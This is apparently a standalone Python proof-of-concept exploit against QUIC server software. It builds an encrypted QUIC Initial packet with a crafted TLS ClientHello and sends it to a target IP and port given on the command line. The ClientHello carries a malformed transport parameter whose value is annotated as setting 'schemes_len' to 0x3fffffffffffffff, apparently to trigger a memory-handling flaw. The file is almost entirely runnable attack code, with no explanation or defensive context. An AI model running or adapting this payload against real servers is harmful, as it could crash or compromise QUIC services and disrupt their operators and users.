import os
from enum import Enum
import binascii
from cryptography.hazmat.primitives import hashes, hmac, serialization
from aioquic.quic.crypto import CryptoContext,INITIAL_CIPHER_SUITE
from aioquic.tls import hkdf_expand_label
import socket
import struct
import argparse

class CipherSuite(Enum):
    AES_128_GCM_SHA256 = 0x1301
    AES_256_GCM_SHA384 = 0x1302
    CHACHA20_POLY1305_SHA256 = 0x1303
    EMPTY_RENEGOTIATION_INFO_SCSV = 0x00FF


class QuicProtocolVersion(Enum):
    NEGOTIATION = 0
    VERSION_1 = 0x00000001
    VERSION_2 = 0x6B3343CF



INITIAL_SALT_VERSION_1 = binascii.unhexlify("38762cf7f55934b34d179ae6a4c80cadccbb7f0a")
INITIAL_SALT_VERSION_2 = binascii.unhexlify("0dede3def700a6db819381be6e269dcbf9bd2ed9")
SAMPLE_SIZE = 16



def hkdf_extract(
    algorithm: hashes.HashAlgorithm, salt: bytes, key_material: bytes
) -> bytes:
    h = hmac.HMAC(salt, algorithm)
    h.update(key_material)
    return h.finalize()


class Quic_client():
    def __init__(self,ip,port) -> None:
        self.ip = ip
        self.port = port
        self.version = QuicProtocolVersion.VERSION_1
        self.peer_cid = os.urandom(8)
        self.is_client = True
        self.send =  CryptoContext()
        self.init_socket()

    def init_socket(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.connect((self.ip, self.port))


    def setup_init(self,cid, is_client, version):
        if is_client:
            recv_label, send_label = b"server in", b"client in"
        else:
            recv_label, send_label = b"client in", b"server in"

        if version == QuicProtocolVersion.VERSION_2:
            initial_salt = INITIAL_SALT_VERSION_2
        else:
            initial_salt = INITIAL_SALT_VERSION_1

        algorithm = hashes.SHA256()
        initial_secret = hkdf_extract(algorithm, initial_salt, cid)
        self.send.setup(
            cipher_suite=INITIAL_CIPHER_SUITE,
            secret=hkdf_expand_label(
                algorithm, initial_secret, send_label, b"", algorithm.digest_size
            ),
            version=version,
        )

    def build_packet(self,peer_cid,local_cid,tls_data,pkt_num):
        self.setup_init(peer_cid,self.is_client,self.version)

        plain_header = b""
        plain_header +=b"\xc1"
        plain_header +=b"\x00\x00\x00\x01" # version
        plain_header +=b"\x08" # dcid len
        plain_header +=peer_cid # dcid
        plain_header +=b"\x08" # scid len
        plain_header +=local_cid # scid
        plain_header +=b"\x00" # token len
        plain_header += struct.pack(">H",(len(tls_data)+22)|0x4000) # length
        plain_header += struct.pack(">H",pkt_num & 0xFFFF)

        plain_payload = b""
        plain_payload += b"\x06" # frame type
        plain_payload += b"\x00" # offset
        plain_payload += struct.pack(">H",len(tls_data)|0x4000) # length
        plain_payload += tls_data


        packet_number = 0
        protected_payload = self.send.aead.encrypt(
            plain_payload, plain_header, packet_number
        )

        pkt = self.send.hp.apply(plain_header, protected_payload)
        return pkt

    def connect(self,peer_cid,local_cid,tls_data,pkt_num):

        pkt = self.build_packet(peer_cid,local_cid,tls_data,pkt_num)
        pkt = pkt.ljust(1200,b"\x00")
        self.sock.send(pkt)
        print("[*] send one pkt")

    def poc(self):
        peer_cid = os.urandom(8)
        local_cid = os.urandom(8)

        pkt_num = 0
        payload = ""
        payload += "01"  # handshake type
        payload += "000238"  # Length
        payload += "0303"  # tls ver
        payload += "7a03486476444b513bbc12bea56f8d7b18ea2b81474158067db8cd344451a563"  # random
        payload += "00"  # session id len
        payload += "0008"  # cipher suite len
        payload += "13011302130300ff"  # cipher suite
        payload += "0100"  # compression len
        payload += "0207"  # Extensions Len
        payload += "00000013001100000e746573742e78717569632e636f6d000b000403000102000a000a00080017001d00180019002300000010000500030268330016000000170000000d0020001e0403050306030708080708080809080a080b080408050806040105010601002b0003020304002d000201010033004700450017004104ef4fa1c2471ac49d9a76cf18bf8e8a25b3d3b1eda438b5a385ea3c49fee591775e9877623cecd2edfbf452613e98ebec8d58c2d0d1105680b78f58765c5a3563002a0000"
        payload = bytes.fromhex(payload)
        # quic transport para
        quic_extension = ""
        quic_extension += "0039"  # type
        quic_extension += "0042"  # quic transport para len
        quic_extension += "01048001d4c0030245dc0408c00000080000000005048100000006048100000007048100000008024400090244000c000e01080f08256c8c1e3bec1bb3"  # some params
        quic_extension += "80fece01"  # type
        quic_extension += "08"  # param len
        quic_extension += "ffffffffffffffff"  # param value, set schemes_len->0x3fffffffffffffff
        quic_extension = bytes.fromhex(quic_extension)
        quic_extension = quic_extension[:2] + struct.pack(">H", len(quic_extension) - 4) + quic_extension[4:]

        payload += quic_extension
        # pre shared key
        payload += bytes.fromhex(
            "002900fb00d600d0e7ccf9719833dd509b48833258f82b14fa74706456de9ac4b9794d7b8182febfbc5531ab09d3cc83acc5ba2da526220d962fda31af2285b9bc24127cd783f95db71173410e1a84df968607c547f285e23787c8cf787b6727ed51256193ef7f1d2daba56c33c722c726b2525757a8c1e799bd5b1769e20f495b606b27b8be1e6d336d2aee10164a95031f6a2e469b4085f9a100e902cca724487e6f3ee641962b7009b8ff8cfe823944f6cc9c81bfbda2e3e6a9c1bac19d8b1164c3e1f04f862b6fa7a83d00548cdaed67c660da751126603d699700212073b22cc6a788e91faf181ae12b97febf9aa81c4bd7cdd99b84b11cf8772e98da")
        payload = payload[:2] + struct.pack(">H", len(payload) - 4) + payload[4:]  # fix header length
        payload = payload[:51] + struct.pack(">H", len(payload) - 53) + payload[53:]  # fix extension length

        tls_data = payload
        self.connect(peer_cid,local_cid,tls_data,pkt_num)

 
if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", help="target ip", type=str)
    parser.add_argument("--port", help="target_port", type=int)


    args = parser.parse_args()
    session = Quic_client(args.ip,args.port)
    session.poc()
